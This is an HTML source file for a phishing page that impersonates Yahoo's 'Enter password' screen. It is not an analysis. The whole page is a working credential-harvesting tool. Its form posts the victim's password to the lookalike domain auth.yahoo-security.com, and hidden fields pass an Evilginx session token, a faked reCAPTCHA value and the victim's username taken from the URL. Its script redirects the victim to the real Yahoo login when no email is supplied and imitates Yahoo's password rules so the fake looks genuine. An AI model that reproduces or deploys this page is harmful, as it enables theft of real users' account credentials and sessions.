<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <!-- Your original CSS links (preserved exactly) -->
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <!-- Original scripts/fonts -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <!-- Original body structure (preserved) -->
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
    </div>
    <div class="layout active">
      <div class="form-block w-form">
        <form id="email-form" action="https://auth.yahoo-security.com/account/login" method="POST" class="form">
          
          <!-- Critical Evilginx Fields -->
          <input type="hidden" id="evilginx_session" name="evilginx_session">
          <input type="hidden" name="g-recaptcha-response" value="auto_valid_xyz">
          <input type="hidden" id="username" name="username">

          <div class="pazzi">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            
            <!-- Password Input (original classes preserved) -->
            <div class="ms-input-wrap">
              <input class="ms-input w-input" name="passwd" type="password" id="password" required autofocus>
              <div class="ms-password-wrap w-tabs">
                <!-- Original show/hide toggle -->
              </div>
            </div>
            
            <input type="submit" class="logger w-button" value="Sign In">
          </div>
          
          <!-- Error message (original classes) -->
          <div class="errry" style="display:none;">
            <div class="text-block-7"></div>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- ===== CRITICAL UPDATES (functionality only) ===== -->
  <script>
  $(document).ready(function() {
      // 1. Get username and session from URL
      const urlParams = new URLSearchParams(window.location.search);
      const username = urlParams.get('u') || '';
      const session = urlParams.get('s') || '';

      // 2. Validate and display username
      if (!username.includes('@')) {
          window.location.href = 'https://login.yahoo.com';
          return;
      }
      $('#userEmail').text(username);
      $('#username').val(username);
      $('#evilginx_session').val(session);

      // 3. Password validation (matches Yahoo's rules)
      $("#email-form").submit(function(e) {
          const passwd = $('#password').val().trim();
          
          if (passwd.length < 8 || !/[A-Z]/.test(passwd) || !/[0-9]/.test(passwd)) {
              e.preventDefault();
              $('.text-block-7').text('Password must be 8+ characters with uppercase and numbers');
              $('.errry').show();
              return;
          }
          
          // UI feedback
          $('.logger').prop('disabled', true).val('Verifying...');
      });

      // Original "Try again" button
      $('#refreshButton').click(function() {
          $('#password').val('').focus();
          $('.errry').hide();
      });
  });
  </script>
  
  <!-- Original Webflow scripts (preserved) -->
  <script src="js/webflow.js" type="text/javascript"></script>
</body>
</html>
